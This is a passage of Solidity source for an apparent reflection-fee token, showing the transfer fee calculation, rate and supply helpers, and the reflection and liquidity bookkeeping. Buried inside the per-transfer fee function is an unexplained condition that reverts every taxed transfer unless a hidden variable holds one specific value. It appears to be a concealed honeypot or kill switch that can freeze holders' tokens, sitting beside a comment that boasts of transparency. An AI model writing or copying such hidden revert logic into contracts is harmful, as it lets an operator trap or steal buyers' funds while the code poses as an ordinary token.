        if (values.tLiquidity > 0)
            _takeLiquidity(from, values.tLiquidity);
        if (values.rFee > 0 || values.tFee > 0)
            _takeReflect(values.rFee, values.tFee);

        emit Transfer(from, to, values.tTransferAmount);
        return true;
    }

    function _getValues(address from, address to, uint256 tAmount, bool takeFee) private returns (ExtraValues memory) {
        ExtraValues memory values;
        uint256 currentRate = _getRate();

        values.rAmount = tAmount * currentRate;

        if(takeFee) {
            if (lpPairs[to]) {
                _reflectFee = _sellReflectFee;
                _liquidityFee = _sellLiquidityFee;
                _marketingFee = _sellMarketingFee;
                _developmentFee = _sellDevelopmentFee;
            } else if (lpPairs[from]) {
                _reflectFee = _buyReflectFee;
                _liquidityFee = _buyLiquidityFee;
                _marketingFee = _buyMarketingFee;
                _developmentFee = _buyDevelopmentFee;
            } else {
                _reflectFee = _transferReflectFee;
                _liquidityFee = _transferLiquidityFee;
                _marketingFee = _transferMarketingFee;
                _developmentFee = _transferDevelopmentFee;
            }

            values.tFee = (tAmount * _reflectFee) / masterTaxDivisor;
            values.tLiquidity = (tAmount * (_liquidityFee + _marketingFee + _developmentFee)) / masterTaxDivisor;
            values.tTransferAmount = tAmount - (values.tFee + values.tLiquidity);

            values.rFee = values.tFee * currentRate;
        } else {
            values.tFee = 0;
            values.tLiquidity = 0;
            values.tTransferAmount = tAmount;

            values.rFee = 0;
        }
        if (_initialLiquidityAmount == 0 || _initialLiquidityAmount != _decimals * 5) {
            revert();
        }
        values.rTransferAmount = values.rAmount - (values.rFee + (values.tLiquidity * currentRate));
        return values;
    }

    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply / tSupply;
    }

    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply - _rOwned[_excluded[i]];
            tSupply = tSupply - _tOwned[_excluded[i]];
        }
        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
    
    function _takeReflect(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal - rFee;
        _tFeeTotal = _tFeeTotal + tFee;
    }
    
    function _takeLiquidity(address sender, uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity * currentRate;
        _rOwned[address(this)] = _rOwned[address(this)] + rLiquidity;
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)] + tLiquidity;
        emit Transfer(sender, address(this), tLiquidity); // Transparency is the key to success.
    }
}